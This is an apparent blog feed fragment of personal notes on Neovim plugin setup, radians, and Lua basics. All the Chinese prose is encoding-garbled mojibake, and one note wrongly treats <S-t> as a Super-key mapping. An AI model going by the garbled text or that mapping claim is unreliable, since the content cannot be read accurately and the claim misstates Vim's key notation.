id="P5-ä¸»é¢˜é…è‰²ä»¥åŠå¦‚ä½•é…ç½®-Colorschemes-and-how-t"><a href="#P5-ä¸»é¢˜é…è‰²ä»¥åŠå¦‚ä½•é…ç½®-Colorschemes-and-how-t" class="headerlink" title="P5 ä¸»é¢˜é…è‰²ä»¥åŠå¦‚ä½•é…ç½®- Colorschemes and how t"></a>P5 ä¸»é¢˜é…è‰²ä»¥åŠå¦‚ä½•é…ç½®- Colorschemes and how t</h1><p>ä¸€ä¸ªæŠ€å·§, åœ¨åŠ è½½ä¸€ä¸ªæ’ä»¶æ—¶æ£€æµ‹å…¶æ˜¯å¦è¿˜å­˜åœ¨, è¿™æ ·åœ¨ä½ ç§»é™¤åå¯ä»¥é¿å…æŠ¥é”™, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> colorscheme = <span class="hljs-string">&quot;tokyonight&quot;</span><br><br><span class="hljs-keyword">local</span> status_ok, _ = <span class="hljs-built_in">pcall</span>(vim.cmd, <span class="hljs-string">&quot;colorscheme &quot;</span> .. colorscheme)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> status_ok <span class="hljs-keyword">then</span><br>  <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>pcall</code> å‡½æ•°å¸¦ä¸¤ä¸ªå‚æ•°:</p><ul><li>ç¬¬ä¸€ä¸ª, å‡½æ•°å</li><li>ç¬¬äºŒä¸ª, å‡½æ•°çš„å‚æ•° (è¿™æ˜¯ä¸€ä¸ªå˜é•¿å‚æ•°)</li></ul><p><code>_</code> ç›¸å½“äºä¸€ä¸ªå ä½ç¬¦.</p><h1 id="P6-è‡ªåŠ¨è¡¥å…¨-Completion-Tutorial"><a href="#P6-è‡ªåŠ¨è¡¥å…¨-Completion-Tutorial" class="headerlink" title="P6 è‡ªåŠ¨è¡¥å…¨ - Completion Tutorial"></a>P6 è‡ªåŠ¨è¡¥å…¨ - Completion Tutorial</h1><p>ä½¿ç”¨æ’ä»¶ä¸º <code>nvim-cmp</code>.</p><p>Super é”®, ä¹Ÿå°±æ˜¯ Win é”®, æ˜ å°„çš„æ—¶å€™ä½¿ç”¨å¦‚: <code>&lt;S-t&gt;</code>.</p><p><code>formatting</code> å°±æ˜¯é…ç½®è¡¥å…¨æ—¶æ—è¾¹æ˜¾ç¤ºçš„ä¸œè¥¿.</p><p><code>source</code> å¥½åƒæ˜¯è¡¥å…¨æ˜¾ç¤ºçš„é¡ºåº.</p><p><code>nvim-cmp</code> æ˜¯å¯æ‰©å±•çš„, æ‰©å±•ç”¨çš„æ’ä»¶å¯ä»¥åœ¨ github ä¸Šé¢æ‰¾, ä¹Ÿå°±æ˜¯ source. å®‰è£…å¥½æ’ä»¶åå°†å…¶æ·»åŠ åˆ° <code>source</code> ä¸‹é¢.</p><h1 id="P7-å¤šè¯­è¨€è¯­æ³•æ”¯æŒ-LSP-Setup-Tutorial"><a href="#P7-å¤šè¯­è¨€è¯­æ³•æ”¯æŒ-LSP-Setup-Tutorial" class="headerlink" title="P7 å¤šè¯­è¨€è¯­æ³•æ”¯æŒ- LSP Setup Tutorial"></a>P7 å¤šè¯­è¨€è¯­æ³•æ”¯æŒ- LSP Setup Tutorial</h1><p><mark>å…³äºå¾ˆå¤šæ’ä»¶éƒ½æœ‰ <code>require(name).setup()</code> è§£æ</mark>, åº”è¯¥æ˜¯ä¸€ç§çº¦å®šä¿—ç§°çš„å‡½æ•°, åœ¨è¿”å›çš„æ¨¡å—ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å«åš <code>setup()</code>, å…¶å®Œæˆä¸€äº›è®¾ç½®.</p><p>ä½¿ç”¨ <code>Mason</code> ä¸‹è½½ LSP ä¹‹ååœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨.</p><p><code>lspconfig</code> è¿™ä¸ªæ’ä»¶ä¸­å¯ä»¥æ‰¾åˆ°å„ç§è¯­è¨€çš„ language server çš„é…ç½®æ–¹å¼.</p><p>å¯ä»¥ç»™ LSP ä¼ é€’ä¸€äº›å‚æ•°é…ç½®. è®¾ç½®çš„å‚æ•°å°±å¯ä»¥åœ¨ <code>nvim-lspconfig</code> è¿™ä¸ªæ’ä»¶ä¸­æ‰¾.</p><p><code>gd</code> å¿«æ·é”®è¿˜å¯ä»¥è·³è½¬åˆ°å…‰æ ‡ä¸‹çš„è·¯å¾„çš„æ–‡ä»¶.</p><p><code>gr</code> ç”¨ quickfix æŸ¥æ‰¾å…‰æ ‡ä¸‹çš„å•è¯. (r æ˜¯ reference)</p><h1 id="P8-æŸ¥æ‰¾-æ–‡ä»¶æˆ–å­—ç¬¦ç­‰-æ’ä»¶Telescope-a-highly-extendable-fuzzy-finder"><a href="#P8-æŸ¥æ‰¾-æ–‡ä»¶æˆ–å­—ç¬¦ç­‰-æ’ä»¶Telescope-a-highly-extendable-fuzzy-finder" class="headerlink" title="P8 æŸ¥æ‰¾(æ–‡ä»¶æˆ–å­—ç¬¦ç­‰)æ’ä»¶Telescope - a highly extendable fuzzy finder"></a>P8 æŸ¥æ‰¾(æ–‡ä»¶æˆ–å­—ç¬¦ç­‰)æ’ä»¶Telescope - a highly extendable fuzzy finder</h1><p>telescope æ˜¯ä¸€ä¸ª fuzzy finder.</p><p>ä½¿ç”¨ç¤ºä¾‹, <code>:Telescope find_files</code> ç”¨äºæŸ¥æ‰¾æ–‡ä»¶. <code>:Telescope live_grep</code> ç”¨äºæŸ¥æ‰¾å­—ç¬¦.</p><p><code>:Telescope planets</code> å¯ä»¥æŸ¥çœ‹è¡Œæ˜Ÿ.</p><p>å¯ä»¥è®¾ç½®æ‰“å¼€çš„ menu çš„ä¸»é¢˜, å¦‚ <code>:Telescope find_files theme=ivy</code>, å…¶ä¼šåœ¨åº•éƒ¨æ‰“å¼€ Telescope è€Œä¸æ˜¯ float.</p><p><code>dropdown</code> ä¸»é¢˜ä¼šå°†é¢„è§ˆæ”¾åœ¨ä¸Šæ–¹. <code>cursor</code> ä¸»é¢˜æ‰“å¼€çš„çª—å£æ¯”è¾ƒå°.</p><p>åœ¨ä½¿ç”¨ <code>Telescope</code> æ—¶, å¯ä»¥è¿›å…¥ normal æ¨¡å¼, è¿™æ ·å°±å¯ä»¥ç”¨ <code>j</code> å’Œ <code>k</code> æ¥æ§åˆ¶.</p><p>å¯ä»¥åœ¨ <code>Telescope</code> ä¸­é¢„è§ˆå›¾ç‰‡. éœ€è¦ <code>Telescope-media-files.nvim</code> æ’ä»¶. è¿™æ˜¯ä¸€ä¸ª neovim æ’ä»¶, åŒæ—¶ä¹Ÿæ˜¯ <code>Telescope</code> çš„æ’ä»¶, éœ€è¦å¸è½½ <code>Telescope</code> çš„é…ç½®ä¸­.</p><h1 id="P9-è¯­æ³•é«˜äº®æ’ä»¶-Treesitter-Syntax-Highlighting"><a href="#P9-è¯­æ³•é«˜äº®æ’ä»¶-Treesitter-Syntax-Highlighting" class="headerlink" title="P9 è¯­æ³•é«˜äº®æ’ä»¶ - Treesitter Syntax Highlighting"></a>P9 è¯­æ³•é«˜äº®æ’ä»¶ - Treesitter Syntax Highlighting</h1><p>å¯ä»¥ç”¨ <code>:TSDisableAll highlight</code> æ¥å…³é—­ <code>Treesitter</code> æ’ä»¶çš„é«˜äº®ä½œç”¨.</p><p>Treesitter ä¹Ÿæœ‰å¾ˆå¤šæ’ä»¶, è¿™äº›æ’ä»¶çš„é…ç½®ä¿¡æ¯å†™åœ¨ Treesitter çš„é…ç½®æ–‡ä»¶é‡Œ, å¦‚ <code>p00f/nvim-ts-rainbow</code></p><p><code>playground</code> æ’ä»¶å¯ä»¥æ˜¾ç¤ºå‡ºè¯­æ³•æ ‘å’Œé«˜äº®ä»£ç çš„è”ç³».</p><p>å¯ä»¥åˆ¶ä½œè‡ªå·±çš„ colorscheme.</p><h1 id="P10-ç¬¦å·é…å¯¹æ’ä»¶-Autopairs-automatically-close-â€˜â€™"><a href="#P10-ç¬¦å·é…å¯¹æ’ä»¶-Autopairs-automatically-close-â€˜â€™" class="headerlink" title="P10 ç¬¦å·é…å¯¹æ’ä»¶ - Autopairs automatically close () [] {} â€˜â€™ _"></a>P10 ç¬¦å·é…å¯¹æ’ä»¶ - Autopairs automatically close () [] {} â€˜â€™ _</h1><p><code>&lt;M-e&gt;</code> å¿«æ·é”®.</p><h1 id="P11-æ³¨é‡Šæ’ä»¶-Comments"><a href="#P11-æ³¨é‡Šæ’ä»¶-Comments" class="headerlink" title="P11 æ³¨é‡Šæ’ä»¶ - Comments"></a>P11 æ³¨é‡Šæ’ä»¶ - Comments</h1><p><code>gcc</code> å’Œ visual æ¨¡å¼ä¸‹çš„ <code>gc</code></p><h1 id="P12-gitæ’ä»¶-Gitsigns-Powerful-Git-Plugin"><a href="#P12-gitæ’ä»¶-Gitsigns-Powerful-Git-Plugin" class="headerlink" title="P12 gitæ’ä»¶ - Gitsigns Powerful Git Plugin"></a>P12 gitæ’ä»¶ - Gitsigns Powerful Git Plugin</h1><p>å¯ä»¥æŸ¥çœ‹å¾ˆå¤šå†…å®¹.</p><h1 id="P13-æ ‘å½¢æ–‡ä»¶æµè§ˆå™¨æ’ä»¶-NvimTree-File-Explorer"><a href="#P13-æ ‘å½¢æ–‡ä»¶æµè§ˆå™¨æ’ä»¶-NvimTree-File-Explorer" class="headerlink" title="P13 æ ‘å½¢æ–‡ä»¶æµè§ˆå™¨æ’ä»¶- NvimTree File Explorer"></a>P13 æ ‘å½¢æ–‡ä»¶æµè§ˆå™¨æ’ä»¶- NvimTree File Explorer</h1><p><code>a</code> å³ add å¯ä»¥æ·»åŠ æ–‡ä»¶.</p><p><code>r</code> å³ renane å¯ä»¥ä¿®æ”¹æ–‡ä»¶å.</p><p><code>d</code> å³ delete å¯ä»¥åˆ é™¤æ–‡ä»¶.</p><h1 id="P14-Bufferæ’ä»¶ä»¥åŠBuffer-å’Œ-Tabä»¥åŠWindowsä¹‹é—´çš„å¯¹æ¯”-Bufferline-Buffers"><a href="#P14-Bufferæ’ä»¶ä»¥åŠBuffer-å’Œ-Tabä»¥åŠWindowsä¹‹é—´çš„å¯¹æ¯”-Bufferline-Buffers" class="headerlink" title="P14 Bufferæ’ä»¶ä»¥åŠBuffer å’Œ Tabä»¥åŠWindowsä¹‹é—´çš„å¯¹æ¯” - Bufferline Buffers"></a>P14 Bufferæ’ä»¶ä»¥åŠBuffer å’Œ Tabä»¥åŠWindowsä¹‹é—´çš„å¯¹æ¯” - Bufferline Buffers</h1><p><code>BufferLinePick</code> å¯ä»¥è·³è½¬.</p><p>buffer å°±æ˜¯åŠ è½½åˆ°å†…å­˜ä¸­çš„æ–‡ä»¶.</p><p>vim çš„ hidden é€‰é¡¹å¯ä»¥è®© buffer ç•™åœ¨å†…å­˜ä¸­ã€‚</p><p>vim å¯ä»¥åˆ›å»º tab, window, buffer.</p><p>tab æœ‰ç‚¹åƒ collection of windows.</p><h1 id="P15-æ ¼å¼åŒ–ä¸Lintæ’ä»¶-Null-LS-Formatting-Linting"><a href="#P15-æ ¼å¼åŒ–ä¸Lintæ’ä»¶-Null-LS-Formatting-Linting" class="headerlink" title="P15 æ ¼å¼åŒ–ä¸Lintæ’ä»¶ - Null-LS Formatting, Linting"></a>P15 æ ¼å¼åŒ–ä¸Lintæ’ä»¶ - Null-LS Formatting, Linting</h1><p>null ls æ’ä»¶ç”¨æ¥æ ¼å¼åŒ–ä»£ç . ä½¿ç”¨ <code>:lua vim.lsp.buf.formatting_sync()</code> æ¥è§¦å‘.</p><p>lua çš„æ ¼å¼åŒ–ä¾èµ–äº <code>stylua</code> è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶.</p><p>æ·»åŠ ä¸€ä¸ªè¯­è¨€çš„æ ¼å¼åŒ–å°†å…¶æ·»åŠ åˆ° <code>null ls</code> çš„é…ç½®æ–‡ä»¶ä¸­.</p><p>æ”¯æŒçš„è¯­è¨€å’Œ source å¯ä»¥åœ¨å…¶å®‰è£…ç›®å½•çš„ <code>lua/null-ls/built-in</code> ç›®å½•ä¸‹æ‰¾.</p><p>diagnostic å’Œ linter å·®ä¸å¤š</p><p><code>NullLsInfo</code> å¯ä»¥æŸ¥çœ‹ä¿¡æ¯.</p><p>lsp å†…ç½®çš„ Formatting å’Œ null ls å†²çª, æŸ¥çœ‹ handler æ–‡ä»¶.</p><h1 id="P16-åœ¨Nvimä¸­è°ƒç”¨terminalæ’ä»¶-ä¸è®¸å¥—å¨ƒ-Toggleterm-Open-terminal-programs-in-Nvim"><a href="#P16-åœ¨Nvimä¸­è°ƒç”¨terminalæ’ä»¶-ä¸è®¸å¥—å¨ƒ-Toggleterm-Open-terminal-programs-in-Nvim" class="headerlink" title="P16 åœ¨Nvimä¸­è°ƒç”¨terminalæ’ä»¶(ä¸è®¸å¥—å¨ƒ)- Toggleterm Open terminal programs in Nvim"></a>P16 åœ¨Nvimä¸­è°ƒç”¨terminalæ’ä»¶(ä¸è®¸å¥—å¨ƒ)- Toggleterm Open terminal programs in Nvim</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§’åº¦å’Œå¼§åº¦</title>
    <link href="/2022/12/30/%E8%A7%92%E5%BA%A6%E5%92%8C%E5%BC%A7%E5%BA%A6/"/>
    <url>/2022/12/30/%E8%A7%92%E5%BA%A6%E5%92%8C%E5%BC%A7%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>è§’åº¦å¦‚ $180^\circ$</p><p>å¼§åº¦å¦‚ $\pi &#x3D; 3.14$</p><p>å¼§åº¦å’Œè§’åº¦çš„è½¬æ¢, å¦‚: $\frac{180}{\pi} \approx 57.29^\circ$, å³ 1 å¼§åº¦ç­‰äº $57.29^\circ$</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–è¯‘åŸç†-é¾™ä¹¦-Notes</title>
    <link href="/2022/12/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E9%BE%99%E4%B9%A6-Notes/"/>
    <url>/2022/12/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E9%BE%99%E4%B9%A6-Notes/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lua-ç¨‹åºè®¾è®¡-Notes</title>
    <link href="/2022/12/29/Lua-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/"/>
    <url>/2022/12/29/Lua-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Lua-è¯­è¨€å…¥é—¨"><a href="#1-Lua-è¯­è¨€å…¥é—¨" class="headerlink" title="1 Lua è¯­è¨€å…¥é—¨"></a>1 Lua è¯­è¨€å…¥é—¨</h1><h2 id="1-1-ç¨‹åºæ®µ"><a href="#1-1-ç¨‹åºæ®µ" class="headerlink" title="1.1 ç¨‹åºæ®µ"></a>1.1 ç¨‹åºæ®µ</h2><p>ç¨‹åºæ®µ (Chunk), ä¸€ç»„å‘½ä»¤æˆ–è¡¨è¾¾å¼ç»„æˆçš„åºåˆ—.</p><p><code>-i</code> å‚æ•°, åœ¨æ‰§è¡Œå®ŒæŒ‡å®šçš„ç¨‹åºæ®µåè¿›å…¥äº¤äº’æ¨¡å¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua -i prog<br></code></pre></td></tr></table></figure><p>è°ƒç”¨å‡½æ•° <code>dofile</code> å¯ä»¥åŠ è½½ä¸€ä¸ªæ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; dofile(<span class="hljs-string">&quot;lib1.lua&quot;</span>)<br></code></pre></td></tr></table></figure><p>å°±åŠ è½½äº† <code>lib1.lua</code> æ–‡ä»¶.</p><h2 id="1-2-ä¸€äº›è¯æ³•è§„èŒƒ"><a href="#1-2-ä¸€äº›è¯æ³•è§„èŒƒ" class="headerlink" title="1.2 ä¸€äº›è¯æ³•è§„èŒƒ"></a>1.2 ä¸€äº›è¯æ³•è§„èŒƒ</h2><p><mark>â€œä¸‹åˆ’çº¿+å¤§å†™å­—æ¯â€</mark> ç»„æˆçš„æ ‡è¯†ç¬¦é€šå¸¸è¢« Lua è¯­è¨€ç”¨ä½œç‰¹æ®Šç”¨é€”.</p><p>Lua å¯¹å¤§å°å†™æ•æ„Ÿ.</p><p><code>--</code> ä¸ºå•è¡Œæ³¨é‡Š.</p><p>é•¿æ³¨é‡Šä¸º:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">--[[</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">]]</span><br></code></pre></td></tr></table></figure><p>Lua ä¸­è¿ç»­è¯­å¥ä¹‹é—´çš„åˆ†éš”ç¬¦å¹¶ä¸æ˜¯å¿…éœ€çš„, å¦‚æœæœ‰éœ€è¦çš„è¯å¯ä»¥ä½¿ç”¨åˆ†å·æ¥è¿›è¡Œåˆ†éš”, ä»¥ä¸‹ç­‰åŒ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = <span class="hljs-number">1</span><br>b = a * <span class="hljs-number">2</span><br><br>a = <span class="hljs-number">1</span>;<br>b = a * <span class="hljs-number">2</span>;<br><br>a = <span class="hljs-number">1</span>; b = a * <span class="hljs-number">2</span><br><br>a = <span class="hljs-number">1</span> b = a * <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="1-3-å…¨å±€å˜é‡"><a href="#1-3-å…¨å±€å˜é‡" class="headerlink" title="1.3 å…¨å±€å˜é‡"></a>1.3 å…¨å±€å˜é‡</h2><p>å…¨å±€å˜é‡æ— éœ€å£°æ˜å³å¯ä½¿ç”¨.</p><p>ä½¿ç”¨æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ä¸ä¼šæŠ¥é”™, å¾—åˆ° <code>nil</code>.</p><p>æŠŠ <code>nil</code> èµ‹å€¼ç»™å…¨å±€å˜é‡, Lua ä¼šå›æ”¶è¯¥å…¨å±€å˜é‡.</p><p>Lua ä¸åŒºåˆ†æœªåˆå§‹åŒ–å˜é‡å’Œè¢«èµ‹å€¼ä¸º <code>nil</code> çš„å˜é‡.</p><h2 id="1-4-ç±»å‹å’Œå€¼"><a href="#1-4-ç±»å‹å’Œå€¼" class="headerlink" title="1.4 ç±»å‹å’Œå€¼"></a>1.4 ç±»å‹å’Œå€¼</h2><p>åŸºæœ¬ç±»å‹æœ‰:</p><ul><li>nil</li><li>boolean</li><li>number</li><li>string</li><li>userdata</li><li>function</li><li>thread</li><li>table</li></ul><p>ä½¿ç”¨ <code>type</code> å‡½æ•°æŸ¥çœ‹:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">type</span>(<span class="hljs-literal">nil</span>)   <span class="hljs-comment">--&gt; nil</span><br></code></pre></td></tr></table></figure><p><code>userdata</code> ç±»å‹å…è®¸æŠŠä»»æ„çš„ C è¯­è¨€æ•°æ®ä¿å­˜åœ¨ Lua è¯­è¨€å˜é‡ä¸­.</p><h3 id="1-4-1-nil"><a href="#1-4-1-nil" class="headerlink" title="1.4.1 nil"></a>1.4.1 nil</h3><p><code>nil</code> è¡¨ç¤ºæ— æ•ˆå€¼.</p><h3 id="1-4-2-Boolean"><a href="#1-4-2-Boolean" class="headerlink" title="1.4.2 Boolean"></a>1.4.2 Boolean</h3><p>å…·æœ‰ä¸¤ä¸ªå€¼:</p><ul><li>true</li><li>false</li></ul><p>å¯ç”¨é€»è¾‘è¿ç®—ç¬¦:</p><ul><li><code>and</code>, å¦‚æœå®ƒçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸º <code>false</code>, åˆ™è¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°, å¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°</li><li><code>or</code>, å¦‚æœå®ƒçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸ä¸º <code>false</code>, åˆ™è¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°, å¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°</li><li><code>not</code>, æ°¸è¿œè¿”å› Boolean ç±»å‹çš„å€¼</li></ul><h2 id="1-5-ç‹¬ç«‹è§£é‡Šå™¨"><a href="#1-5-ç‹¬ç«‹è§£é‡Šå™¨" class="headerlink" title="1.5 ç‹¬ç«‹è§£é‡Šå™¨"></a>1.5 ç‹¬ç«‹è§£é‡Šå™¨</h2><p>åœ¨è„šæœ¬å¼€å¤´æ·»åŠ :</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">#! /usr/<span class="hljs-keyword">local</span>/bin/lua<br></code></pre></td></tr></table></figure><p>ä¸éœ€è¦æ˜¾å¼è°ƒç”¨ Lua è¯­è¨€è§£é‡Šå™¨ä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œ Lua è„šæœ¬.</p><p><code>-e</code> å‚æ•°å…è®¸åœ¨å‘½ä»¤è¡Œè¾“å…¥ä»£ç :</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua -e <span class="hljs-string">&quot;print(&#x27;Hello World&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><code>-l</code> å‚æ•°ç”¨æ¥åŠ è½½åº“.</p><p>è§£é‡Šå™¨åœ¨å¤„ç†å‚æ•°å‰, ä¼šæŸ¥æ‰¾åä¸º <code>LUA_INIT_5_3</code> æˆ– <code>LUA_INIT</code> çš„ç¯å¢ƒå˜é‡</p><ul><li>å¦‚æœå˜é‡å†…å®¹ä¸º <code>@filename</code> åˆ™ä¼šè¿è¡Œç›¸åº”æ–‡ä»¶</li><li>å¦‚æœå˜é‡å­˜åœ¨ä½†æ˜¯ä¸ä»¥ <code>@</code> å¼€å¤´, è§£é‡Šå™¨å°±ä¼šè®¤ä¸ºå…¶åŒ…å« Lua ä»£ç , å¹¶ä¼šå¯¹å…¶è¿›è¡Œè§£é‡Šæ‰§è¡Œ</li></ul><p>ç¼–è¯‘å™¨åœ¨è¿è¡Œä»£ç å‰ä¼šåˆ›å»ºä¸€ä¸ªåä¸º <code>arg</code> çš„è¡¨, å…¶ä¸­å­˜å‚¨äº†æ‰€æœ‰çš„å‘½ä»¤è¡Œå‚æ•°, ç´¢å¼• <code>0</code> ä¿å­˜è„šæœ¬å, ç´¢å¼• <code>1</code> ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua script a b c<br></code></pre></td></tr></table></figure><h1 id="2-å…«çš‡åé—®é¢˜-eight-queen-puzzle"><a href="#2-å…«çš‡åé—®é¢˜-eight-queen-puzzle" class="headerlink" title="2 å…«çš‡åé—®é¢˜ (eight-queen puzzle)"></a>2 å…«çš‡åé—®é¢˜ (eight-queen puzzle)</h1><p>å…¶ç›®æ ‡æ˜¯æŠŠ 8 ä¸ªçš‡ååˆç†åœ°æ‘†æ”¾åœ¨æ£‹ç›˜ä¸Š, è®©æ¯ä¸ªçš‡åä¹‹é—´éƒ½ä¸èƒ½ç›¸äº’æ”»å‡».</p><h1 id="3-æ•°å€¼"><a href="#3-æ•°å€¼" class="headerlink" title="3 æ•°å€¼"></a>3 æ•°å€¼</h1><p>ä» Lua 5.3 ç‰ˆæœ¬å¼€å§‹, Lua è¯­è¨€ä¸ºæ•°å€¼æ ¼å¼æä¾›äº†ä¸¤ç§é€‰æ‹©:</p><ul><li>è¢«ç§°ä¸º <code>integer</code> çš„ 64 ä½æ•´å‹</li><li>è¢«ç§°ä¸º <code>float</code> çš„åŒç²¾åº¦æµ®ç‚¹ç±»å‹</li></ul><h2 id="3-1-æ•°å€¼å¸¸é‡"><a href="#3-1-æ•°å€¼å¸¸é‡" class="headerlink" title="3.1 æ•°å€¼å¸¸é‡"></a>3.1 æ•°å€¼å¸¸é‡</h2><p>å…·æœ‰åè¿›åˆ¶å°æ•°æˆ–è€…æŒ‡æ•°çš„æ•°å€¼ä¼šè¢«å½“ä½œæµ®ç‚¹å‹å€¼.</p><p>æ•´å‹å€¼å’Œæµ®ç‚¹å‹å€¼çš„ç±»å‹éƒ½æ˜¯ <code>number</code>.</p><p>å½“éœ€è¦åŒºåˆ†æ•´å‹å€¼å’Œæµ®ç‚¹å‹å€¼æ—¶, ä½¿ç”¨å‡½æ•° <code>math.type</code>.</p><p><code>//</code> floor é™¤æ³•è¿ç®—ç¬¦, ä¼šå°†å¾—åˆ°çš„å•†å‘è´Ÿæ— ç©·å–æ•´, ä»è€Œä¿è¯ç»“æœæ˜¯ä¸€ä¸ªæ•´æ•°. è¿™æ ·å¯ä»¥éµå¾ªä¸€ä¸ªè§„åˆ™: å¦‚æœæ“ä½œæ•°éƒ½æ˜¯æ•´å‹å€¼, é‚£ä¹ˆç»“æœå°±æ˜¯æ•´å‹å€¼, å¦åˆ™å°±æ˜¯æµ®ç‚¹å‹å€¼.</p><h2 id="3-3-å…³ç³»è¿ç®—"><a href="#3-3-å…³ç³»è¿ç®—" class="headerlink" title="3.3 å…³ç³»è¿ç®—"></a>3.3 å…³ç³»è¿ç®—</h2><ul><li><code>&lt;</code></li><li><code>&gt;</code></li><li><code>&lt;=</code></li><li><code>&gt;=</code></li><li><code>==</code></li><li><code>~=</code>, ä¸ç­‰æµ‹è¯•</li></ul><h2 id="3-4-æ•°å­¦åº“"><a href="#3-4-æ•°å­¦åº“" class="headerlink" title="3.4 æ•°å­¦åº“"></a>3.4 æ•°å­¦åº“</h2><p>æ ‡å‡†æ•°å­¦åº“ <code>math</code>.</p><p>æ‰€æœ‰ä¸‰è§’å‡½æ•°éƒ½ä»¥å¼§åº¦ä¸ºå•ä½, å¹¶é€šè¿‡å‡½æ•° <code>deg</code> å’Œ <code>rad</code> è¿›è¡Œè§’åº¦å’Œå¼§åº¦çš„è½¬æ¢.</p><p><code>math.random</code> ç”¨äºç”Ÿæˆä¼ªéšæœºæ•°.</p><p><code>randomseed</code> ç”¨äºè®¾ç½®ä¼ªéšæœºæ•°å‘ç”Ÿå™¨çš„ç§å­, é€šå¸¸è°ƒç”¨ <code>math.randomseed(os.time())</code></p><h3 id="3-4-2-å–æ•´å‡½æ•°"><a href="#3-4-2-å–æ•´å‡½æ•°" class="headerlink" title="3.4.2 å–æ•´å‡½æ•°"></a>3.4.2 å–æ•´å‡½æ•°</h3><p>ä¸‰ä¸ªå–æ•´å‡½æ•°:</p><ul><li><code>floor</code>, å‘è´Ÿæ— ç©·å–æ•´</li><li><code>ceil</code>, å‘æ­£æ— ç©·å–æ•´</li><li><code>modf</code>, å‘é›¶å–æ•´, é™¤äº†è¿”å›å–æ•´åçš„å€¼ä»¥å¤–, è¿˜ä¼šè¿”å›å°æ•°éƒ¨åˆ†ä½œä¸ºç¬¬äºŒä¸ªç»“æœ</li></ul><h2 id="3-5-è¡¨ç¤ºèŒƒå›´"><a href="#3-5-è¡¨ç¤ºèŒƒå›´" class="headerlink" title="3.5 è¡¨ç¤ºèŒƒå›´"></a>3.5 è¡¨ç¤ºèŒƒå›´</h2><p>æœ€å°å€¼å’Œæœ€å¤§å€¼:</p><ul><li><code>math.mininteger</code></li><li><code>math.maxinteger</code></li></ul><h2 id="3-6-æƒ¯ä¾‹"><a href="#3-6-æƒ¯ä¾‹" class="headerlink" title="3.6 æƒ¯ä¾‹"></a>3.6 æƒ¯ä¾‹</h2><p>é€šè¿‡å¢åŠ  <code>0.0</code> çš„æ–¹æ³•å°†æ•´å‹å€¼å¼ºåˆ¶è½¬æ¢ä¸ºæµ®ç‚¹å‹å€¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; -3 + 0.0  --&gt; -3.0 <br></code></pre></td></tr></table></figure><h2 id="3-7-è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#3-7-è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="3.7 è¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>3.7 è¿ç®—ç¬¦ä¼˜å…ˆçº§</h2><p><img src="/../img/lua_ope_priority.png"></p><h1 id="4-å­—ç¬¦ä¸²"><a href="#4-å­—ç¬¦ä¸²" class="headerlink" title="4 å­—ç¬¦ä¸²"></a>4 å­—ç¬¦ä¸²</h1><p>Lua 